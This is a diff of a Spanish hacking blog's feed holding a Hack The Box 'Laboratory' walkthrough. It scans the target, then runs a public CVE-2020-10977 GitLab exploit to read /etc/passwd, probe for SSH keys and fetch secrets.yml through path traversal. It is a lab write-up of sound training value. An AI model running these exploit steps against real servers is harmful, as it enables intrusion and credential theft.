@@ -1,4 +1,548 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-20T20:21:50-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Networked</title><link href="http://localhost:4000/htb-networked/" rel="alternate" type="text/html" title="Hack The Box Networked" /><published>2022-03-20T00:00:00-06:00</published><updated>2022-03-20T00:00:00-06:00</updated><id>http://localhost:4000/htb-networked</id><content type="html" xml:base="http://localhost:4000/htb-networked/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-networked/banner-networked.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-21T22:26:50-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Laboratory</title><link href="http://localhost:4000/htb-laboratory/" rel="alternate" type="text/html" title="Hack The Box Laboratory" /><published>2022-03-21T00:00:00-06:00</published><updated>2022-03-21T00:00:00-06:00</updated><id>http://localhost:4000/htb-laboratory</id><content type="html" xml:base="http://localhost:4000/htb-laboratory/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-laboratory/banner-laboratory.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;laboratory&quot;&gt;Laboratory&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.216.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.216
+PING 10.10.10.216 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.216&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.216: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;135 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.216 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 134.779/134.779/134.779/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.216 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-21 11:28 CST
+Initiating SYN Stealth Scan at 11:28
+Scanning 10.10.10.216 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.10.10.216
+Discovered open port 443/tcp on 10.10.10.216
+Discovered open port 22/tcp on 10.10.10.216
+Completed SYN Stealth Scan at 11:28, 27.44s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.216
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.22s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2022-03-21 11:28:08 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
+Not shown: 65532 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 63
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;27.53 seconds
+           Raw packets sent: 131085 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;880B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 121 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.216
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80,443
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,443 10.10.10.216 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-21 11:29 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.216
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.33s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp  open  http     Apache httpd 2.4.41
+|_http-title: Did not follow redirect to https://laboratory.htb/
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+443/tcp open  ssl/http Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: The Laboratory
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;laboratory.htb
+| Subject Alternative Name: DNS:git.laboratory.htb
+| Not valid before: 2020-07-05T10:39:28
+|_Not valid after:  2024-03-03T10:39:28
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: Host: laboratory.htb&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;25.89 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aquí ya vemos cosas interesantes, los dominios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;laboratory.htb&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git.laboratory.htb&lt;/code&gt;; incluso lo podemos corroborar al hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; a la dirección IP:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.216/
+http://10.10.10.216/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.216], RedirectLocation[https://laboratory.htb/], Title[302 Found]
+ERROR Opening: https://laboratory.htb/ - no address &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;laboratory.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que al hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; a la dirección IP por el puerto 80, este nos redirige hacia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;laboratory.htb&lt;/code&gt; por el puerto 443. Por lo tanto, vamos a agregar los dominios a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y antes de ver el contenido vía web, aplicaremos nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb https://laboratory.htb/
+https://laboratory.htb/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.216], JQuery, Script, Title[The Laboratory]
+❯ whatweb https://git.laboratory.htb/
+https://git.laboratory.htb/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;502 Bad Gateway] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[10.10.10.216], Script, Title[GitLab is not responding &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;502&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, nginx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Algo que ya vemos es que nos enfrentamos a un &lt;a href=&quot;https://about.gitlab.com/&quot;&gt;GitLab&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-laboratory/laboratory-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No contamos con credenciales de acceso; sin embargo, podemos registrarnos, así que eso haremos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-laboratory/laboratory-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Es importante que el correo que demos debe ser &lt;strong&gt;loquesea@laboratory.htb&lt;/strong&gt;. Una vez ingresando, vamos a ver que versión de gitlab es:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-laboratory/laboratory-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos enfrentamos antes &lt;strong&gt;&lt;em&gt;GitLab Community Edition (CE) 12.8.1&lt;/em&gt;&lt;/strong&gt;; por lo tanto, vamos a buscar posibles exploits que nos ayuden a vulnerar la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit gitlab 12
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                 |  Path
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+GitLab 12.9.0 - Arbitrary File Read                                                            | ruby/webapps/48431.txt
+Gitlab 12.9.0 - Arbitrary File Read &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                            | ruby/webapps/49076.py
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que no está nuestra versión; sin embargo, es posible que pueda aplicar, por lo tanto vamos a buscar algún exploit que nos ayude a leer archivos del sistema y encontramos &lt;a href=&quot;https://github.com/thewhiteh4t/cve-2020-10977&quot;&gt;cve-2020-10977&lt;/a&gt;. Por lo tanto, vamos a descargarlo y probarlo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wget https://raw.githubusercontent.com/thewhiteh4t/cve-2020-10977/main/cve_2020_10977.py
+&lt;span class=&quot;nt&quot;&gt;--2022-03-21&lt;/span&gt; 13:06:57--  https://raw.githubusercontent.com/thewhiteh4t/cve-2020-10977/main/cve_2020_10977.py
+Resolviendo raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
+Conectando con raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)[&lt;/span&gt;185.199.109.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 8422 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.2K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/plain]
+Grabando a: «cve_2020_10977.py»
+
+cve_2020_10977.py                100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;   8.22K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    en 0s      
+
+2022-03-21 13:06:57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;97.2 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - «cve_2020_10977.py» guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;8422/8422]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con al autor, nos dice como debemos ejecutarlo; por lo tanto, le pasamos los parámetros que nos indica y probaremos leer el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 cve_2020_10977.py https://git.laboratory.htb k4miyo k4miyo123
+&lt;span class=&quot;nt&quot;&gt;----------------------------------&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; CVE-2020-10977 &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; GitLab Arbitrary File Read &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 12.9.0 &amp;amp; Below &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;----------------------------------&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Found By : vakzz       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; https://hackerone.com/reports/827052 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; PoC By   : thewhiteh4t &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; https://twitter.com/thewhiteh4t      &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Target        : https://git.laboratory.htb
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Username      : k4miyo
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password      : k4miyo123
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Project Names : ProjectOne, ProjectTwo
+
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Trying to Login...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Login Successful!
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating ProjectOne...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] ProjectOne Created Successfully!
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating ProjectTwo...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] ProjectTwo Created Successfully!
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Absolute Path to File : /etc/passwd
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating an Issue...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Issue Created Successfully!
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Moving Issue...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Issue Moved Successfully!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/2b6405acf51ef61d0dda1451135d4c3a/passwd
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/passwd
+&lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+git:x:998:998::/var/opt/gitlab:/bin/sh
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
+registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
+gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
+gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
+
+&lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Absolute Path to File :
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; de la máquina víctima. Ahora debemos pensar o buscar algún recurso de interés que no ayude a ingresar a la máquina; podríamos tratar de ver &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;; sin embargo, no está.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Absolute Path to File : /home/git/.ssh/id_rsa  
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating an Issue...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Issue Created Successfully!
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Moving Issue...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Issue Moved Successfully!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../home/git/.ssh/id_rsa
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] No such file or directory
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Absolute Path to File :
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Algo curioso del resultado, es que aplica un &lt;strong&gt;Directory Traversal&lt;/strong&gt;. Si vamos al final del repositorio, vemos unas ligas y la que nos interesa es &lt;a href=&quot;https://hackerone.com/reports/827052&quot;&gt;hackerone&lt;/a&gt;, ya que encontramos que podemos obtener ejecución de comandos a nivel de sistema. Primero debemos obtener el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key_base&lt;/code&gt; que se encuentra bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/1affb44c93c09dc8fca22f1549d57a10/secrets.yml                 
+                                                                                                                                 
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml                                                                   
+&lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;                                                                                         
+                                                                                                                                 
+&lt;span class=&quot;c&quot;&gt;# This file is managed by gitlab-ctl. Manual changes will be                                                                     &lt;/span&gt;
